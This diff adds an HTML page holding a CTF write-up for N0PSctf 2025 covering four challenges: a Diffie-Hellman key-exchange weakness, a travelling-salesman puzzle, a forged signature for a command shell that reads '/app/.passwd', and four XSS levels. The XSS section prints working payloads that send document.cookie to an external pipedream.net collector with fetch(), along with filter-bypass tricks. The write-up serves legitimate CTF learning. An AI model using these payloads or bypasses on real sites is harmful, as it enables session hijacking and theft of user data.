@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="/static/favicon.ico" type="image/x-icon">
+
+  <link rel="stylesheet" type="text/css" href="/static/asciinema-player.css" />
+  <script>MathJax = {tex: {inlineMath: [["$", "$"]], displayMath: [["$$", "$$"]], processEscapes: !1}}</script>
+  <script type="text/javascript" id="MathJax-script" async
+    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+
+  <style>
+    /* HLJS CODE HIGHLIGHTING */
+    pre code.hljs {
+      display: block;
+      overflow-x: auto;
+      padding: 1em
+    }
+
+    code.hljs {
+      padding: 3px 5px
+    }
+
+    .hljs {
+      background: #fefefe;
+      color: #545454
+    }
+
+    .hljs-comment,
+    .hljs-quote {
+      color: #696969
+    }
+
+    .hljs-deletion,
+    .hljs-name,
+    .hljs-regexp,
+    .hljs-selector-class,
+    .hljs-selector-id,
+    .hljs-tag,
+    .hljs-template-variable,
+    .hljs-variable {
+      color: #d91e18
+    }
+
+    .hljs-attribute,
+    .hljs-built_in,
+    .hljs-link,
+    .hljs-literal,
+    .hljs-meta,
+    .hljs-number,
+    .hljs-params,
+    .hljs-type {
+      color: #aa5d00
+    }
+
+    .hljs-addition,
+    .hljs-bullet,
+    .hljs-string,
+    .hljs-symbol {
+      color: green
+    }
+
+    .hljs-section,
+    .hljs-title {
+      color: #007faa
+    }
+
+    .hljs-keyword,
+    .hljs-selector-tag {
+      color: #7928a1
+    }
+
+    .hljs-emphasis {
+      font-style: italic
+    }
+
+    .hljs-strong {
+      font-weight: 700
+    }
+
+    @media screen and (-ms-high-contrast:active) {
+
+      .hljs-addition,
+      .hljs-attribute,
+      .hljs-built_in,
+      .hljs-bullet,
+      .hljs-comment,
+      .hljs-link,
+      .hljs-literal,
+      .hljs-meta,
+      .hljs-number,
+      .hljs-params,
+      .hljs-quote,
+      .hljs-string,
+      .hljs-symbol,
+      .hljs-type {
+        color: highlight
+      }
+
+      .hljs-keyword,
+      .hljs-selector-tag {
+        font-weight: 700
+      }
+    }
+
+    /* HLJS CODE HIGHLIGHTING END */
+
+    header div a::before {
+      content: '';
+      display: block;
+      position: absolute;
+      bottom: 14%;
+      left: 0;
+      width: 100%;
+      height: 40%;
+      transform: rotate(-1deg);
+      background-color: orange;
+      z-index: -1;
+      opacity: .3;
+      transition: opacity .2s ease-in-out;
+    }
+
+    header div a:hover::before {
+      opacity: .8;
+    }
+
+    header div a {
+      font-size: 1.8rem;
+      display: inline-block;
+      position: relative;
+      text-decoration: none;
+      color: inherit;
+    }
+
+    header {
+      margin-top: 1rem;
+    }
+
+    header>div {
+      text-align: center;
+    }
+
+    body {
+      padding: 0 1rem;
+      margin: 0 auto;
+      color: #333333;
+      max-width: 36rem;
+      line-height: 1.55;
+    }
+
+    @media screen and (min-width:70ch) {
+      main {
+        word-break: auto-phrase;
+        text-align: justify;
+        text-justify: inter-character;
+        hyphens: auto;
+        hyphenate-limit-lines: 2;
+      }
+    }
+
+    /* what follows are common sense defaults for all pages that inherit this layout.html */
+    h1 {
+      font-size: 2.25rem;
+      line-height: 2.5rem;
+      text-align: center;
+    }
+
+    ul,
+    ol {
+      text-align: left;
+    }
+
+    hr {
+      margin: 32px 0;
+    }
+
+    li {
+      margin: 4px 0;
+    }
+
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6 {
+      line-height: 1.2;
+    }
+
+    /* From https://developer.mozilla.org/en-US/docs/Web/HTML/Element/kbd */
+    kbd>kbd {
+      text-indent: 0;
+      background-color: #eee;
+      border-radius: 3px;
+      border: 1px solid #b4b4b4;
+      box-shadow:
+        0 1px 1px rgba(0, 0, 0, 0.2),
+        0 2px 0 0 rgba(255, 255, 255, 0.7) inset;
+      color: #333;
+      display: inline-block;
+      font-size: 0.9em;
+      font-weight: 700;
+      line-height: 1;
+      padding: 2px 4px;
+      white-space: nowrap;
+    }
+
+    aside {
+      border-left: 2px solid gray;
+      border-radius: 2px;
+      padding-left: 16px;
+      margin: 0;
+      margin-left: 32px;
+    }
+
+    code,
+    pre {
+      font-family: ui-monospace, 'Cascadia Code', 'Source Code Pro', Menlo, Consolas, 'DejaVu Sans Mono', monospace !important;
+      overflow-y: hidden;
+      hyphens: auto;
+    }
+
+    :not(pre)>code {
+      font-size: 90%;
+    }
+
+    p+p {
+      margin-top: 1.3em;
+    }
+
+    pre {
+      border-radius: 8px;
+      background-color: #f2f2f2;
+      border: 1px solid #bfbfbf;
+      padding: 4px 7px;
+      overflow-x: auto;
+      font-size: .8rem;
+    }
+
+    .img+pre {
+      margin-top: 1rem;
+    }
+
+    pre:has(+.img) {
+      margin-bottom: 1rem;
+    }
+
+    [id^="asciinema-cast-"] {
+      max-width: 100%;
+      border-radius: 8px;
+      height: min-content;
+      display: block;
+      margin: 0 auto;
+    }
+
+    img {
+      max-width: 100%;
+      border-radius: 8px;
+      height: auto;
+      display: block;
+      margin: 0 auto;
+    }
+
+    .hljs-meta.prompt_ {
+      user-select: none;
+    }
+
+
+    summary {
+      cursor: pointer;
+      user-select: none;
+
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      margin-bottom: 20px;
+    }
+
+    details>summary::before {
+      content: '>';
+      font-weight: 700;
+      padding-right: 10px;
+    }
+
+    details[open]>summary::before {
+      content: '^';
+    }
+
+    summary::after {
+      content: "";
+      flex-grow: 1;
+      height: 1px;
+      background-color: #333;
+      margin-left: 10px;
+    }
+
+    .code-preview.collapsed {
+      position: relative;
+    }
+
+    .code-preview.collapsed pre {
+      max-height: 300px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .code-preview.collapsed pre::after {
+      content: "";
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 350px;
+      background: linear-gradient(to top, rgba(0,0,0,0.3) 25%, rgba(0,0,0,0.12) 50%, rgba(0,0,0,0.0) 100%);
+      pointer-events: none;
+    }
+
+    .code-preview .expand-btn {
+      position: absolute;
+      left: 50%;
+      bottom: 10%;
+      transform: translate(-50%, 10%);
+      border: 1px solid black;
+      border-radius: 4px;
+      background: none;
+      background-color: rgba(239, 239, 239, 0.7);
+      padding: 8px;
+      width: 180px;
+    }
+
+    .code-preview .expand-btn:hover {
+      background-color: rgba(239, 239, 239);
+    }
+
+    .code-preview:not(.collapsed) .expand-btn {
+      position: sticky;
+      left: 50%;
+      transform: translate(-50%);
+    }
+  </style><title>DD: N0PSctf 2025 Writeup - Kevin Cao</title>
+<meta name="description" content="KEY EXCHANGE" />
+<style>
+  h2,
+  h3,
+  h4,
+  h5,
+  h6 {
+    margin-top: 32px;
+    margin-bottom: 12px;
+    margin-left: -28px;
+    text-decoration: underline;
+  }
+
+  @media (min-width: 42rem) {
+    pre {
+      margin-left: -2rem;
+      width: calc(100% + 4rem);
+    }
+  }
+
+  @media (min-width: 42rem) {
+    img {
+      margin-left: -2rem;
+	  max-width: calc(100% + 4rem) !important;
+      width: calc(100% + 4rem);
+    }
+  }
+
+  @media (min-width: 42rem) {
+	[id^="asciinema-cast-"] {
+      margin-left: -2rem;
+	  max-width: calc(100% + 4rem) !important;
+      width: calc(100% + 4rem);
+    }
+  }
+
+  header>h1 {
+    color: #333;
+    padding: 0 1rem;
+    text-align: center;
+  }
+</style></head>
+
+<body><header><div>
+      <a href="/">back to homepage</a>
+    </div></header>
+
+  <main><article>
+  <header>
+    <h1>DD: N0PSctf 2025 Writeup</h1>
+    <div style="padding-bottom:1rem; text-align:center"><time>Jun 3, 2025</time></div>
+  </header>
+  <h3>Key Exchange</h3><p>We are given this code:</p><div class="code-preview collapsed" id="1"><pre ><span class="hljs-keyword">from</span> Crypto.Util <span class="hljs-keyword">import</span> number
+<span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint
+<span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes
+<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES
+<span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad
+<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256
+<span class="hljs-keyword">import</span> sys
+
+N = <span class="hljs-number">1024</span>
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_pub_key</span>(<span class="hljs-params">size</span>):
+    q = number.getPrime(size)
+    k = <span class="hljs-number">1</span>
+    p = k*q + <span class="hljs-number">1</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> number.isPrime(p):
+        k += <span class="hljs-number">1</span>
+        p = k*q + <span class="hljs-number">1</span>
+    h = randint(<span class="hljs-number">2</span>, p-<span class="hljs-number">1</span>)
+    g = <span class="hljs-built_in">pow</span>(h, (p-<span class="hljs-number">1</span>)//q, p)
+    <span class="hljs-keyword">while</span> g == <span class="hljs-number">1</span>:
+        h = randint(<span class="hljs-number">2</span>, p-<span class="hljs-number">1</span>)
+        g = <span class="hljs-built_in">pow</span>(h, (p-<span class="hljs-number">1</span>)//q, p)
+    <span class="hljs-keyword">return</span> p, g
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_encrypted_flag</span>(<span class="hljs-params">k</span>):
+    k = sha256(k).digest()
+    iv = get_random_bytes(AES.block_size)
+    data = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()
+    cipher = AES.new(k, AES.MODE_CBC, iv)
+    padded_data = pad(data, AES.block_size)
+    encrypted_data = iv + cipher.encrypt(padded_data)
+    <span class="hljs-keyword">return</span> encrypted_data
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    p, g = gen_pub_key(N)
+    a = randint(<span class="hljs-number">2</span>, p-<span class="hljs-number">1</span>)
+    k_a = <span class="hljs-built_in">pow</span>(g, a, p)
+    sys.stdout.buffer.write(p.to_bytes(N))
+    sys.stdout.buffer.write(g.to_bytes(N))
+    sys.stdout.buffer.write(k_a.to_bytes(N))
+    sys.stdout.flush()
+    k_b = <span class="hljs-built_in">int</span>.from_bytes(sys.stdin.buffer.read(N))
+    k = <span class="hljs-built_in">pow</span>(k_b, a, p)
+    sys.stdout.buffer.write(get_encrypted_flag(k.to_bytes((k.bit_length() + <span class="hljs-number">7</span>) // <span class="hljs-number">8</span>)))</pre><button class="expand-btn" onclick="(()=>{const p=document.getElementById('1');const btn=p.querySelector('.expand-btn');if(p.classList.contains('collapsed')){p.classList.remove('collapsed');btn.textContent='Show Less'}else{p.classList.add('collapsed');btn.textContent='Show More';p.scrollIntoView({behavior:'instant',block:'start'})}})()">Show More</button></div><p>using this,</p><pre ><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256
+<span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path
+
+<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+key = sha256(<span class="hljs-string">b&#x27;&#x27;</span>).digest()
+
+conn = remote(<span class="hljs-string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="hljs-number">26625</span>)
+conn.recv(<span class="hljs-number">1024</span> * <span class="hljs-number">3</span>)
+conn.send(<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">1024</span>)
+data = conn.recvall()
+conn.close()
+iv = data[: AES.block_size]
+ciphertext = data[AES.block_size :]
+Path(<span class="hljs-string">&#x27;data&#x27;</span>).write_bytes(AES.new(key, AES.MODE_CBC, iv).decrypt(ciphertext))</pre><p>It turns out the decrypted <code>data</code> is a PNG file showing the flag.</p><h3>G-Bee-S</h3><p>There is a bee living in N0PStopia, named Valentine. She loves waterlilies, and lots of them are located around her beehive. However, she needs some help to find a good way to visit all of them while tralling the shortest distance, can you help her? She does not need the best path, but at least one that is good enough.</p><p>Note: Each line is the coordinates of a waterlily. The beehive is located in (0,0), and the path has to start from there and end there. Each flower has to be visited one time, but not more. When submitting, you have to send the order of flowers to be visited. For instance, if your path is to visit the 2nd flower, then the 3rd, then the 1st, you will send 0 2 3 1 0, where 0 represents the beehive. In order to be valid, your path has to have a total length of less than 1400.</p><pre ><span class="hljs-keyword">import</span> math
+<span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path
+
+<span class="hljs-keyword">import</span> networkx <span class="hljs-keyword">as</span> nx
+<span class="hljs-keyword">from</span> networkx.algorithms <span class="hljs-keyword">import</span> approximation
+
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>(<span class="hljs-params">coordinates</span>):
+    G = nx.Graph()
+    <span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> coordinates:
+        G.add_node((x, y))
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">dist</span>(<span class="hljs-params">c1, c2</span>):
+        <span class="hljs-keyword">return</span> math.sqrt((c1[<span class="hljs-number">0</span>] - c2[<span class="hljs-number">0</span>]) ** <span class="hljs-number">2</span> + (c1[<span class="hljs-number">1</span>] - c2[<span class="hljs-number">1</span>]) ** <span class="hljs-number">2</span>)
+
+    <span class="hljs-keyword">for</span> i, c1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(coordinates):
+        <span class="hljs-keyword">for</span> j, c2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(coordinates):
+            <span class="hljs-keyword">if</span> i &lt; j:
+                G.add_edge(c1, c2, weight=dist(c1, c2))
+
+    path = approximation.christofides(G)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;distance:&#x27;</span>, <span class="hljs-built_in">sum</span>(dist(a, b) <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(path, path[<span class="hljs-number">1</span>:])))
+    <span class="hljs-keyword">return</span> path
+
+
+xs = [(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)]
+<span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> Path(<span class="hljs-string">&#x27;flowers.txt&#x27;</span>).read_text().splitlines():
+    a, b = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, line.split())
+    xs.append((a, b))
+
+path = solve(xs)
+<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> path:
+    <span class="hljs-built_in">print</span>(xs.index((c[<span class="hljs-number">0</span>], c[<span class="hljs-number">1</span>])), end=<span class="hljs-string">&#x27; &#x27;</span>)
+<span class="hljs-built_in">print</span>()</pre><h3>CrypTopiaShell</h3><p>We just found a breach in CrypTopia servers, and we have a shell access! However, they are using a custom shell to run commands in an authenticated way. We managed to exfiltrate the source code and a sample file, can you find a way to execute commands??</p><div class="code-preview collapsed" id="2"><pre ><span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode
+
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">CrypTopiaShell</span>():
+
+    <span class="hljs-comment"># THE VALUES OF P AND K ARE NOT THE CORRECT ONES AND ARE ONLY PLACEHOLDERS</span>
+    P = <span class="hljs-number">0xdf5321e0a509b27419d9680b0a20698c841b6420906047d58b15ae331df19f0ac38703bd109e64098e77567ffb62fe2814be54e0e1a3aef9a5e58f5bf7a8437d41a6402aad078ae4d118274337bb0b1e2c943ae7c3f9f12c3602560434e5fc1dc373a272259b6d803731e696e4c9f9ef0420ff95225f321d81c3650a469240c523e81a26134dcbdf0b12ba941c09b0aae856fc4fdd6b8f1cf7a7e61796d042dc3921d7d0231338008ee1fe8f2f9d33ea0d669d9c25af51df10ab3ef612e3071088abef9572aa82228791a7bf218771de5db5ebec68a405f9646e05d44cae5932c5e0a1c95b672fd3d1a2f120b918391391c7cd569e59656904ac7f14cb33e4bb</span>
+    K = <span class="hljs-number">0x9f9798d08dc88586a04a234525f591413e8d45b13d1ffe2c071e281d28bd8381</span>
+
+    G = <span class="hljs-number">0x8b6eec60fae5681c</span>
+    MAGIC = <span class="hljs-string">b&quot;\x01\x02CrypTopiaSig\x03\x04&quot;</span>
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__sign</span>(<span class="hljs-params">self, gen, key, mod</span>):
+        bl = gen.bit_length()
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(self.data)):
+            gen = (gen ^ (self.data[i] &lt;&lt; (i % bl))) &amp; <span class="hljs-number">2</span>**bl-<span class="hljs-number">1</span>
+        s = <span class="hljs-number">1</span>
+        <span class="hljs-keyword">while</span> key:
+            <span class="hljs-keyword">if</span> key &amp; <span class="hljs-number">1</span>:
+                s = s * gen % mod
+            key = key &gt;&gt; <span class="hljs-number">1</span>
+            gen = gen * gen % mod
+        <span class="hljs-keyword">return</span> s
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">self, data</span>):
+        self.data = data
+        self.signature = self.__sign(self.G, self.K, self.P).to_bytes(self.P.bit_length()//<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;big&#x27;</span>)
+        self.header = self.MAGIC + <span class="hljs-built_in">len</span>(self.data).to_bytes(<span class="hljs-number">6</span>, <span class="hljs-string">&#x27;big&#x27;</span>) + <span class="hljs-built_in">len</span>(self.signature).to_bytes(<span class="hljs-number">6</span>, <span class="hljs-string">&#x27;big&#x27;</span>)
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, data</span>):
+        <span class="hljs-keyword">if</span> data[:<span class="hljs-built_in">len</span>(self.MAGIC)]!= self.MAGIC:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Missing magic bytes&quot;</span>)
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+        length = <span class="hljs-built_in">int</span>.from_bytes(data[<span class="hljs-built_in">len</span>(self.MAGIC):<span class="hljs-built_in">len</span>(self.MAGIC)+<span class="hljs-number">6</span>], <span class="hljs-string">&#x27;big&#x27;</span>)
+        signature_length = <span class="hljs-built_in">int</span>.from_bytes(data[<span class="hljs-built_in">len</span>(self.MAGIC)+<span class="hljs-number">6</span>:<span class="hljs-built_in">len</span>(self.MAGIC)+<span class="hljs-number">12</span>], <span class="hljs-string">&#x27;big&#x27;</span>)
+        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &gt; <span class="hljs-built_in">len</span>(self.MAGIC)+<span class="hljs-number">12</span>+length+signature_length:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid data size&quot;</span>)
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+        self.data = data[<span class="hljs-built_in">len</span>(self.MAGIC)+<span class="hljs-number">12</span>:<span class="hljs-built_in">len</span>(self.MAGIC)+<span class="hljs-number">12</span>+length]
+        self.signature = data[<span class="hljs-built_in">len</span>(self.MAGIC)+<span class="hljs-number">12</span>+length:<span class="hljs-built_in">len</span>(self.MAGIC)+<span class="hljs-number">12</span>+length+signature_length]
+        <span class="hljs-keyword">if</span> self.__sign(self.G, self.K, self.P).to_bytes(self.P.bit_length()//<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;big&#x27;</span>) != self.signature:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid signature&quot;</span>)
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):
+        <span class="hljs-keyword">try</span>:
+            os.system(self.data)
+        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Woops! Something went wrong&quot;</span>)
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">self</span>):
+        <span class="hljs-keyword">return</span> self.header + self.data + self.signature
+
+ctc = CrypTopiaShell()
+
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to CrypTopiaShell!\nProvide base64 encoded shell commands in the CrypTopiaSig format in order to get them executed.&quot;</span>)
+
+<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+    <span class="hljs-keyword">try</span>:
+        data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;$ &quot;</span>)
+        <span class="hljs-keyword">try</span>:
+            data = b64decode(data)
+        <span class="hljs-keyword">except</span>:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid base64 data&quot;</span>)
+            <span class="hljs-keyword">continue</span>
+        <span class="hljs-keyword">try</span>:
+            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ctc.parse(data):
+                <span class="hljs-keyword">continue</span>
+            ctc.run()
+        <span class="hljs-keyword">except</span>:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Invalid CrypTopiaSig file&quot;</span>)
+    <span class="hljs-keyword">except</span>:
+        <span class="hljs-keyword">break</span></pre><button class="expand-btn" onclick="(()=>{const p=document.getElementById('2');const btn=p.querySelector('.expand-btn');if(p.classList.contains('collapsed')){p.classList.remove('collapsed');btn.textContent='Show Less'}else{p.classList.add('collapsed');btn.textContent='Show More';p.scrollIntoView({behavior:'instant',block:'start'})}})()">Show More</button></div><p>solve:</p><pre ><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode
+<span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *
+
+gen_init = <span class="hljs-number">0x8B6EEC60FAE5681C</span>
+bl = gen_init.bit_length()
+
+suffix_bytes = [BitVec(<span class="hljs-string">f&quot;suffix_<span class="hljs-subst">&lbrace;i&rbrace;</span>&quot;</span>, <span class="hljs-number">64</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)]
+data = <span class="hljs-built_in">list</span>(prefix := <span class="hljs-string">b&quot;cat /app/.passwd #&quot;</span>) + suffix_bytes
+
+gen = gen_init
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):
+    gen = (gen ^ (data[i] &lt;&lt; (i % bl))) &amp; (<span class="hljs-number">2</span>**bl - <span class="hljs-number">1</span>)
+s = Solver()
+s.add(gen == <span class="hljs-number">0</span>)
+<span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> suffix_bytes:
+    s.add(byte &gt;= <span class="hljs-number">32</span>)
+    s.add(byte &lt;= <span class="hljs-number">127</span>)
+
+<span class="hljs-keyword">if</span> s.check() == sat:
+    model = s.model()
+    l = []
+    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> suffix_bytes:
+        b = model[byte]
+        l.append(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-keyword">if</span> b <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> b.as_long())
+    suffix = <span class="hljs-built_in">bytes</span>(l)
+
+    <span class="hljs-comment"># check correctness.</span>
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">sign_test</span>(<span class="hljs-params">gen, data</span>):
+        bl = gen.bit_length()
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):
+            gen = (gen ^ (data[i] &lt;&lt; (i % bl))) &amp; <span class="hljs-number">2</span>**bl - <span class="hljs-number">1</span>
+        <span class="hljs-keyword">return</span> gen
+
+    <span class="hljs-keyword">assert</span> sign_test(gen_init, prefix + suffix) == <span class="hljs-number">0</span>
+<span class="hljs-keyword">else</span>:
+    <span class="hljs-keyword">assert</span> <span class="hljs-literal">False</span>
+
+
+MAGIC = <span class="hljs-string">b&quot;\x01\x02CrypTopiaSig\x03\x04&quot;</span>
+
+data = prefix + suffix
+signature = (<span class="hljs-number">0</span>).to_bytes(<span class="hljs-number">2048</span> // <span class="hljs-number">8</span>, <span class="hljs-string">&quot;big&quot;</span>)
+payload = (
+    MAGIC
+    + <span class="hljs-built_in">len</span>(data).to_bytes(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;big&quot;</span>)
+    + <span class="hljs-built_in">len</span>(signature).to_bytes(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;big&quot;</span>)
+    + data
+    + signature
+)
+<span class="hljs-built_in">print</span>(b64encode(payload).decode())</pre><h3>XSS Lab</h3><p>The website we are given consists of four XSS challenges with different filters. We have an input box. For the first one, no filter is present,</p><pre style="hyphens:none; text-align:start; white-space:pre-wrap; word-wrap:break-word">&lt;script&gt;fetch(&#039;https://eojc7r5qjrndu2t.m.pipedream.net/xss?cookie=&#039; + document.cookie)&lt;/script&gt;</pre><p>From this, we get a cookie value of <code>xss2=/0d566d04bbc014c2d1d0902ad50a4122</code>. It represents the subdirectory the next challenge takes place on. In the second challenge, we have to bypass this filter:</p><pre ><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_2</span>(<span class="hljs-params">payload</span>):
+    regex = <span class="hljs-string">&quot;.*(script|(&lt;/.*&gt;)).*&quot;</span>
+    <span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(regex, payload):
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Nope&quot;</span>
+    <span class="hljs-keyword">return</span> payload</pre><p>Which is easy enough. Just switch to an image tag instead of a script tag. (I realize now that I could&#039;ve just varied the case spelling of the script tag, but I didn&#039;t think of it in the moment.)</p><pre style="hyphens:none; text-align:start; white-space:pre-wrap; word-wrap:break-word">&lt;img src=/ onerror=&quot;fetch(&#039;https://eojc7r5qjrndu2t.m.pipedream.net/xss?cookie=&#039;+document.cookie)&quot;&gt;</pre><p>Now onto the third challenge. We have this filter:</p><pre ><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_3</span>(<span class="hljs-params">payload</span>):
+    regex = <span class="hljs-string">&quot;.*(://|script|(&lt;/.*&gt;)|(on\w+\s*=)).*&quot;</span>
+    <span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(regex, payload):
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Nope&quot;</span>
+    <span class="hljs-keyword">return</span> payload</pre><p>So we can just vary the case of <code>ONERROR</code>.</p><pre style="hyphens:none; text-align:start; white-space:pre-wrap; word-wrap:break-word">&lt;img src=/ ONERROR=&quot;fetch(&#039;https:/&#039;+&#039;/eojc7r5qjrndu2t.m.pipedream.net/xss?cookie=&#039;+document.cookie)&quot;&gt;</pre><p>Now onto the fourth challenge. We have,</p><pre ><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_4</span>(<span class="hljs-params">payload</span>):
+    regex = <span class="hljs-string">&quot;(?i:(.*(/|script|(&lt;/.*&gt;)|document|cookie|eval|string|(\&quot;|&#x27;|`).*((&#x27;.+&#x27;)|(\&quot;.+\&quot;)|(`.+`)).*(\&quot;|&#x27;|`)).*))|(on\w+\s*=)|\+|!&quot;</span>
+    <span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(regex, payload):
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Nope&quot;</span>
+    <span class="hljs-keyword">return</span> payload</pre><p>We aren&#039;t allowed to use the forward slash character, so I replace that with just <code>a</code>. Now just JSFuck encode the payload, the previous fetch code, to not trip any of the regex, and we are done. This is the final payload, and the flag is in the cookie we exfiltrate.</p><pre >&lt;img src=a ONERROR=&quot;&lt;JS FUCKED CODE HERE&gt;&quot;&gt;</pre>
+</article></main></body>
+
+</html>
